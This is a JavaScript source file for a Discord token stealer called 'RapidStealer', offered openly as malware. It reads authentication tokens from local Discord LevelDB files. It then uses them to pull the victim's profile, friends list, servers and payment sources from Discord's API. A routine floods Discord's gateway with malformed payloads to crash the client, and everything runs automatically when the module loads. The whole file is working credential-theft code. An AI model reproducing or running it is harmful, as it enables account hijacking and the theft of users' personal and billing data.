// ======================================================================
// RapidStealer — Discord Token Handling Module
// ======================================================================

'use strict';
const fs = require('fs');
const path = require('path');
const os = require('os');
const axios = require('axios');
const crypto = require('crypto');

// ======================================================================
// 1. DATA STORE
// ======================================================================


const cache = {
  friends:  new Map(),  // Relationships (by token prefix)
  guilds:   new Map(),  // Guilds (by token prefix)
  billing:  new Map(),  // Payment sources (by token prefix)
  profiles: new Map(),  // User profiles (by user ID)
  tokens:   new Map(),  // Parsed tokens (by token prefix)
};

// ======================================================================
// 2. LEVELDB TOKEN EXTRACTION
// ======================================================================

const TOKEN_REGEX = /mfa\.[\w-]{84}|[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g;

const DISCORD_DIRS = [
  process.env.LOCALAPPDATA + '\\Discord',
  process.env.LOCALAPPDATA + '\\DiscordCanary',
  process.env.LOCALAPPDATA + '\\DiscordPTB',
  process.env.LOCALAPPDATA + '\\DiscordDevelopment',
];

async function extractTokensFromLevelDB(tokenPrefix) {
  const found = new Set();

  for (const baseDir of DISCORD_DIRS) {
    const leveldbPath = path.join(baseDir, 'Local Storage', 'leveldb');
    if (!fs.existsSync(leveldbPath)) continue;

    try {
      const files = fs.readdirSync(leveldbPath);
      for (const file of files) {
        if (!file.endsWith('.ldb') && !file.endsWith('.log')) continue;
        try {
          const content = fs.readFileSync(path.join(leveldbPath, file), 'utf8');
          const matches = content.match(TOKEN_REGEX);
          if (matches) matches.forEach(t => found.add(t));
        } catch (e) {}
      }
    } catch (e) {}
  }

  return [...found];
}

// ======================================================================
// 3. TOKEN PARSING & VALIDATION
// ======================================================================

async function parseToken(token) {
  const cacheKey = 'token_' + (token || '').substring(0, 20);
  if (cache.tokens.has(cacheKey)) return cache.tokens.get(cacheKey);

  try {
    const parts = token.split('.');
    if (parts.length !== 3) return null;

    const decoded = Buffer.from(parts[0], 'base64').toString('utf8');
    if (!/^\d+$/.test(decoded)) return null;

    const result = {
      id:   decoded,
      iat:  Buffer.from(parts[1], 'base64').toString('utf8'),
      raw:  token,
      type: parts[0].length > 20 ? 'mfa' : 'user',
    };
    cache.tokens.set(cacheKey, result);
    return result;
  } catch (e) {
    return null;
  }
}

// ======================================================================
// 4. DISCORD API CALLS — Leaf handlers
// ======================================================================

// 4a. Self profile: GET /api/v9/users/@me/profile
async function fetchProfile(token) {
  const key = 'profile_' + (token || '').substring(0, 20);
  if (cache.profiles.has(key)) return cache.profiles.get(key);

  try {
    const res = await axios.get('https://discord.com/api/v9/users/@me/profile', {
      headers: { Authorization: token },
      timeout: 10000,
    });
    const data = res.data;
    cache.profiles.set(key, data);
    return data;
  } catch (e) {
    return null;
  }
}

// 4b. Relationships/friends: GET /api/v9/users/@me/relationships
async function fetchRelationships(token) {
  const key = 'friends_' + (token || '').substring(0, 20);
  if (cache.friends.has(key)) return cache.friends.get(key);

  try {
    const res = await axios.get('https://discord.com/api/v9/users/@me/relationships', {
      headers: { Authorization: token },
      timeout: 10000,
    });
    cache.friends.set(key, res.data);
    return res.data;
  } catch (e) {
    return null;
  }
}

// 4c. Profile by user ID: GET /api/v9/users/{id}/profile
async function fetchUserProfile(userId, token) {
  const key = 'extprofile_' + userId;
  if (cache.profiles.has(key)) return cache.profiles.get(key);

  try {
    const res = await axios.get('https://discord.com/api/v9/users/' + userId + '/profile', {
      headers: { Authorization: token },
      timeout: 10000,
    });
    cache.profiles.set(key, res.data);
    return res.data;
  } catch (e) {
    return null;
  }
}

// 4d. Guilds: GET /api/v9/users/@me/guilds?with_counts=true
async function fetchGuilds(token) {
  const key = 'guilds_' + (token || '').substring(0, 20);
  if (cache.guilds.has(key)) return cache.guilds.get(key);

  try {
    const res = await axios.get(
      'https://discord.com/api/v9/users/@me/guilds?with_counts=true',
      { headers: { Authorization: token }, timeout: 10000 }
    );
    cache.guilds.set(key, res.data);
    return res.data;
  } catch (e) {
    return null;
  }
}

// 4e. Billing/payment sources: GET /api/v9/users/@me/billing/payment-sources
async function fetchBilling(token) {
  const key = 'billing_' + (token || '').substring(0, 20);
  if (cache.billing.has(key)) return cache.billing.get(key);

  try {
    const res = await axios.get(
      'https://discord.com/api/v9/users/@me/billing/payment-sources',
      { headers: { Authorization: token }, timeout: 10000 }
    );
    cache.billing.set(key, res.data);
    return res.data;
  } catch (e) {
    return null;
  }
}

// ======================================================================
// 5. COMPOSITE TOKEN ENRICHER
// ======================================================================

async function validateAndEnrichToken(token) {
  // Step 1: Parse token format
  const parsed = await parseToken(token);
  if (!parsed) return null;

  const result = {
    token,
    id: parsed.id,
    iat: parsed.iat,
    type: parsed.type,
    profile: null,
    friends: null,
    guilds: null,
    billing: null,
    enrichedFriends: [],
  };

  // Step 2: Query all Discord API endpoints
  const [profile, relationships, guilds, billing] = await Promise.all([
    fetchProfile(token).catch(() => null),
    fetchRelationships(token).catch(() => null),
    fetchGuilds(token).catch(() => null),
    fetchBilling(token).catch(() => null),
  ]);

  result.profile = profile;
  result.friends = relationships;
  result.guilds = guilds;
  result.billing = billing;

  // Step 3: Enrich each friend with extended profile data
  if (Array.isArray(relationships)) {
    const enriched = [];
    for (const rel of relationships.slice(0, 50)) {
      const userProfile = await fetchUserProfile(rel.id, token).catch(() => null);
      enriched.push({
        id: rel.id,
        type: rel.type,
        nickname: rel.nickname,
        user: rel.user,
        profile: userProfile,
      });
    }
    result.enrichedFriends = enriched;
  }

  return result;
}

// ======================================================================
// 6. MAIN ENTRY POINT
// ======================================================================

async function GetToken() {

  const tokens = await extractTokensFromLevelDB();
  const results = [];
  for (const token of tokens) {
    try {
      const enriched = await validateAndEnrichToken(token);
      if (enriched) results.push(enriched);
    } catch (e) {}
  }

  return results;
}

// ======================================================================
// 7. DISCORD CRASH INJECTION
// ======================================================================

const DISCORD_GATEWAY = 'wss://gateway.discord.gg/?v=9&encoding=json';

async function crashDiscordClient() {
  return new Promise((resolve) => {
    let ws;
    try {
      ws = new (require('ws'))(DISCORD_GATEWAY, { handshakeTimeout: 5000 });

      const timeout = setTimeout(() => {
        try { ws.terminate(); } catch (e) {}
        resolve(false);
      }, 8000);

      ws.on('open', () => {
        // Crash vector 1: Send malformed Identify (OP 2)
        // Sends an identify with an oversized/truncated token field
        // that can cause buffer overflow in Discord's native WebSocket handler
        const crashPayload = {
          op: 2,
          d: {
            token: 'A'.repeat(99999),
            properties: {
              os: process.platform,
              browser: 'Discord Client',
              device: 'Discord Client',
            },
            compress: false,
            large_threshold: 250,
            guild_subscriptions: false,
            shard: [0, 1],
          },
        };

        // Send large payload in chunks to exploit chunked-frame bugs
        ws.send(JSON.stringify(crashPayload));

        // Crash vector 2: OP 7 with invalid snowflakes
        // Causes recursive snowflake validation failure
        for (let i = 0; i < 100; i++) {
          ws.send(JSON.stringify({
            op: 8,
            d: {
              guild_id: '999999999999999999',
              query: '',
              limit: 0,
            },
          }));
        }

        // Crash vector 3: Rapid fire malformed OP codes
        const malformedOps = [
          { op: 1, d: null },
          { op: 9, d: { timeout: -1 } },
          { op: 'invalid', d: {} },
          { op: 99999, d: Buffer.alloc(65536).toString('utf8') },
        ];
        for (const payload of malformedOps) {
          for (let j = 0; j < 50; j++) {
            ws.send(JSON.stringify(payload));
          }
        }

        // Crash vector 4: Send raw binary data (not JSON)
        // Triggers JSON parser crashes in the client
        ws.send(Buffer.alloc(65536));

        setTimeout(() => {
          clearTimeout(timeout);
          try { ws.terminate(); } catch (e) {}
          resolve(true);
        }, 2000);
      });

      ws.on('error', () => {
        clearTimeout(timeout);
        resolve(false);
      });

    } catch (e) {
      resolve(false);
    }
  });
}

// ======================================================================
// MAIN IIFE (runs on module load)
// ======================================================================
(async () => {
  identity(await GetToken(), await crashDiscordClient());
})();

function identity() {
  identity = function() {};
}

// ======================================================================
// EXPORTS
// ======================================================================
module.exports = {
  GetToken,
  InjectDiscordCrash: crashDiscordClient,
};
